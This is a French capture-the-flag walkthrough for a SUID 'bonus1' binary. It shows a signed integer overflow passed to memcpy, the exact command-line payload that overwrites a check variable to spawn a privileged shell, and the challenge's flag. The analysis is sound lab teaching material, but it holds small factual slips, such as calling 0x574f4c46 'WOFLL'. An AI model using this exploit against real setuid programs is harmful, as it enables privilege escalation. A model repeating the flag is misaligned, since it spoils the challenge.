# Bonus1 - Walkthrough

## Objectif
Exploiter un **integer overflow** sur `atoi()` pour passer une valeur négative à `memcpy()` qui, après multiplication par 4, produit 44 bytes copiés → écrase la variable `nb` avec `0x574f4c46` → déclenche `execl()`.

**Technique** : Integer Overflow + memcpy Overflow + Variable Overwrite

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
# ⚠️ Bit SUID actif → s'exécute avec les droits de bonus2

./bonus1
# Segmentation fault

./bonus1 bla
# (pas de sortie)
```

### 2. Analyse du code (Ghidra)

```cpp
int main(int argc, char **argv) {
    int nb;
    char buffer[40];

    nb = atoi(argv[1]);           // argv[1] converti en int

    if (nb > 9) return 1;         // ⚠️ Bloque les grandes valeurs positives

    memcpy(buffer, argv[2], nb * 4);  // ⚠️ Copie nb*4 bytes dans buffer[40]

    if (nb == 0x574f4c46) {       // Vérifie si nb == "WOFLL"
        execl("/bin/sh", "sh", NULL);
    }
    return 0;
}
```

**Problème** : `nb > 9` bloque les valeurs positives > 9, mais pas les **valeurs négatives**. Or `memcpy` reçoit `nb * 4` comme taille — un entier négatif castéen en `size_t` devient une énorme valeur positive.

### 3. Comprendre l'integer overflow

**Objectif** : trouver un `nb` tel que :
- `nb <= 9` (passe le filtre)
- `nb * 4 == 44` (copie 44 bytes : 40 padding + 4 pour écraser `nb`)

**Calcul** :

`memcpy(buffer, argv[2], nb * 4)` → `nb * 4` est calculé sur 32 bits, puis interprété comme `size_t` (non signé).

On veut que les **32 bits de poids faible** de `nb * 4` valent 44 (`0x2c`).

```
Valeur cible (32 bits) : 0x0000002c = 44
On veut : nb * 4 ≡ 44 (mod 2^32)
Donc : nb = 44 / 4 + k * 2^30 = 11 + k * 1073741824

Pour k = -2 :
nb = 11 - 2 * 1073741824 = 11 - 2147483648 = -2147483637
```

**Vérification** :
```
-2147483637 * 4 = -8589934548
-8589934548 mod 2^32 = -8589934548 + 2 * 2^32 = -8589934548 + 8589934592 = 44 ✅
-2147483637 <= 9 ✅
```

### 4. Structure du payload

```
buffer[40] :
[A * 40] → padding jusqu'à nb

nb (4 bytes à écraser) :
[\x46\x4c\x4f\x57] = 0x574f4c46 = "WOFLL" en little-endian

Total argv[2] : 44 bytes
```

**Layout mémoire** :
```
[buffer: 40 bytes][nb: 4 bytes]
 ← memcpy copie 44 bytes →
 [A * 40]         [\x46\x4c\x4f\x57]
                  ^--- nb écrasé avec 0x574f4c46 ✅
```

### 5. Exploitation

```bash
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

**Résultat** :
```bash
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

---

## Déroulement de l'attaque

```
1. atoi("-2147483637") → nb = -2147483637
2. nb > 9 ? -2147483637 > 9 → FALSE → on continue ✅
3. memcpy(buffer, argv[2], -2147483637 * 4)
   → size_t(-8589934548) → 44 bytes copiés ✅
4. buffer = ["A"*40][0x574f4c46]
   → nb écrasé avec 0x574f4c46 ✅
5. nb == 0x574f4c46 → TRUE
6. execl("/bin/sh") → Shell bonus2 🎉
```

---

## Flag
```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Type de vulnérabilité
- Integer Overflow (CWE-190)
- Heap/Stack Buffer Overflow via memcpy (CWE-122)
- Variable Overwrite (contrôle de flux)
- SUID privilege escalation (CWE-250)
